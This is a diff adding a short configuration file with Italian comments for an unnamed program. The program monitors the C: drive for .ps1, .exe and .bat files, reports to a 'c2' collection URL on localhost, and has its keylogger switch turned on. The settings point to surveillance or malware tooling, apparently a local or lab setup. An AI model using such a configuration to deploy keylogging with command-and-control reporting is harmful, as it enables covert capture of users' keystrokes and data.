@@ -1,0 +1,18 @@
+#path da monitorare ricorsivo - termina con \
+c:\
+#estensioni da monitorare - in sequenza suddivisi da ; iniziano con .
+.ps1;.exe;.bat
+#path da escludere dal monitoring  - termina con \
+c:\windows\
+#path temp per il servizio - termina con \ - non usare stessa fold del programma
+c:\temp\
+#esclusione della temp dal monitoring 0 no - 1 si
+0
+#ricorsione dalla root da monitoring 0 no - 1 si
+1
+#elimina error.log alla chiusura 0 no - 1 si
+0
+#url c2 - inserire # se non è disponibile
+http://localhost/c2/collect.php
+#enable keylogger 0 no - 1 si
+1
